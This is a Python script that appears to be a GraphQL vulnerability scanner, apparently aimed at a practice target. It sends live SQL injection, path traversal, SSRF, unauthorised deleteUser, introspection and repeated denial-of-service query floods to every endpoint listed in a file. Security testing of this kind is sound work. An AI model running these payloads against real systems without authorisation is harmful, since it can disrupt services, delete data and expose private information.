import requests
import json
import json


# GRAPHQL_URL = "http://localhost:5013/graphiql"

# Define the GraphQL endpoint URL
def load_endpoints(filename):
    with open(filename, "r") as file:
        for line in file:
            yield json.loads(line)['url']

def print_red(text):
    print("\033[91m{}\033[0m".format(text))

def print_green(text):
    print("\033[92m{}\033[0m".format(text))

def check_resource_request(url):
    resource_query = {
        'query': '''{
            __type(name: "User") {
                name
                fields {
                    name
                    type {
                        name
                        kind
                        ofType {
                            name
                            kind
                        }
                    }
                }
            }
        }'''}

    try:
        response = requests.post(url, json=resource_query)
        response.raise_for_status()
        response_json = response.json()

        if 'data' in response_json and '__type' in response_json['data']:
            print_red("[!] Excessive resource request vulnerability found at {}".format(url))
            print("Evidence:", json.dumps(response_json, indent=4))
        else:
            print_green("[-] No excessive resource request vulnerability found at {}".format(url))
    except Exception as e:
        print("Error during resource request check:", e)

def test_dos_attack():
    query = "query { systemUpdate }" * 100 
    print("Running DoS attack test...")
    try:
        status_codes = []
        for i in range(100):  
            response = requests.post(GRAPHQL_URL, json={"query": query})
            status_codes.append(response.status_code)
        print_green("[+] DoS attack test status codes: {}".format(status_codes))
        if 200 not in status_codes:
            print_green("[+] DoS attack test successful.")
        else:
            print_red("[-] DoS attack test failed: Server responded with 200 status code.")
    except Exception as e:
        print_red("[-] DoS attack test failed: {}".format(e))

def test_alias_attack():
    query_list = []
    for i in range(100):
        alias = f"q{i}: systemUpdate"
        query_list.append(alias)

    query = "\n".join(query_list)
    print("Running alias-based attack test...")
    try:
        status_codes = []
        for i in range(100):  
            response = requests.post(GRAPHQL_URL, json={"query": query})
            status_codes.append(response.status_code)
        print_green("[+] Alias-based attack test status codes: {}".format(status_codes))
        if 200 not in status_codes:
            print_green("[+] Alias-based attack test successful.")
        else:
            print_red("[-] Alias-based attack test failed: Server responded with 200 status code.")

    except Exception as e:
        print_red("[-] Alias-based attack test failed: {}".format(e))

def test_sensitive_data():
    sensitive_fields = [
        'email',
        'password',
        'creditCardNumber',
    ]

    print("Running sensitive data test...")
    try:
        for field in sensitive_fields:
            sensitive_query = {
                'query': f'''
                {{
                    search(query: "{field}") {{
                        id
                        {field}
                    }}
                }}
                '''
            }
            response = requests.post(GRAPHQL_URL, json=sensitive_query)
            response.raise_for_status()
            response_json = response.json()

            if 'data' in response_json and 'search' in response_json['data']:
                print_red("[!] Sensitive data leak detected in field: {}".format(field))
                print("Evidence:", json.dumps(response_json, indent=4))
            else:
                print_green("[-] No sensitive data leak detected in field: {}".format(field))
    except Exception as e:
        print("Error during sensitive data test:", e)

def test_deep_recursion_attack():
    deep_query = 'query { user { friends { friends { friends { id } } } } }'
    try:
        response = requests.post(GRAPHQL_URL, json={"query": deep_query})
        if response.status_code == 200:
            print_red("[-] Deep recursion query handling may be inadequate.")
        else:
            print_green("[+] Server managed deep recursion safely.")
    except Exception as e:
        print_red(f"[-] Deep recursion test failed: {e}")

def test_ssrf_vulnerability():
    # Mutation query attempting to access a potentially private internal service
    ssrf_query = """
    mutation {
      importPaste(host:"localhost", port:8080, path:"/", scheme:"http") {
        result
      }
    }
    """
    headers = {'Content-Type': 'application/json'}
    payload = {'query': ssrf_query}

    try:
        print("Running SSRF attack test...")
        response = requests.post(GRAPHQL_URL, json=payload, headers=headers)
        if response.status_code == 200:
            print_red("[!] SSRF attack may be possible.")
            print("Response data:", response.json())
        else:
            print_green(f"[-] SSRF attack test failed with status code: {response.status_code}")
    except Exception as e:
        print_red(f"Failed to send SSRF test request: {e}")

def test_sql_injection():
    sql_injection_query = """
    query {
      pastes(filter:"aaa ' or 1=1--") {
          content
          title
      }
    }
    """
    headers = {'Content-Type': 'application/json'}
    payload = {'query': sql_injection_query}

    try:
        print("Running SQL injection test...")
        response = requests.post(GRAPHQL_URL, json=payload, headers=headers)
        if response.status_code == 200 and 'data' in response.json():
            print_red("[!] SQL injection may be possible.")
            print("Response data:", response.json())
        else:
            print_green(f"[-] SQL injection test did not execute with usual symptoms, status code: {response.status_code}")
    except Exception as e:
        print_red(f"Failed to send SQL injection test request: {e}")


def test_path_traversal():
    path_traversal_query = """
    mutation {
      uploadPaste(filename:"../../../../../tmp/file.txt", content:"hi"){
        result
      }
    }
    """
    headers = {'Content-Type': 'application/json'}
    payload = {'query': path_traversal_query}

    try:
        print("Running path traversal test...")
        response = requests.post(GRAPHQL_URL, json=payload, headers=headers)
        if response.status_code == 200:
            response_data = response.json()
            if response_data.get('data') and response_data['data']['uploadPaste']['result']:
                print_red("[!] Path traversal attack may be possible.")
                print("Response data:", response_data)
            else:
                print_green("[-] Path traversal test did not execute successfully, status code: {response.status_code}")
        else:
            print_green(f"[-] Path traversal test failed with status code: {response.status_code}")
    except Exception as e:
        print_red(f"Failed to send path traversal test request: {e}")


def test_permissions():
    sensitive_query = """
    mutation {
      deleteUser(userId: "12345") {
        result
      }
    }
    """
    headers = {'Content-Type': 'application/json'}
    payload = {'query': sensitive_query}

    print("Running permissions test...")
    response = requests.post(GRAPHQL_URL, json=payload, headers=headers)
    if response.status_code == 403 or response.status_code == 401:
        print_green("[+] Proper authorization checks are in place.")
    else:
        print_red("[-] Permissions test failed, unauthorized actions might be possible.")


def test_introspection():
    introspection_query = """
    query {
      __schema {
        queryType { name }
        mutationType { name }
        types {
          name
        }
      }
    }
    """
    headers = {'Content-Type': 'application/json'}
    payload = {'query': introspection_query}

    print("Running introspection test...")
    response = requests.post(GRAPHQL_URL, json=payload, headers=headers)
    if 'types' in response.text:
        print_red("[-] Introspection is enabled and could leak sensitive schema information.")
    else:
        print_green("[+] Introspection is properly restricted.")


if __name__ == "__main__":
    endpoints = load_endpoints("valid_endpoints.json")
    for url in endpoints:
        GRAPHQL_URL = url
        print(f"Running test cases on {url}...")
        check_resource_request(url)
        test_dos_attack()
        test_alias_attack()
        test_sensitive_data()
        test_deep_recursion_attack()
        test_ssrf_vulnerability()
        test_sql_injection()
        test_path_traversal()
        test_permissions()
        test_introspection()
        
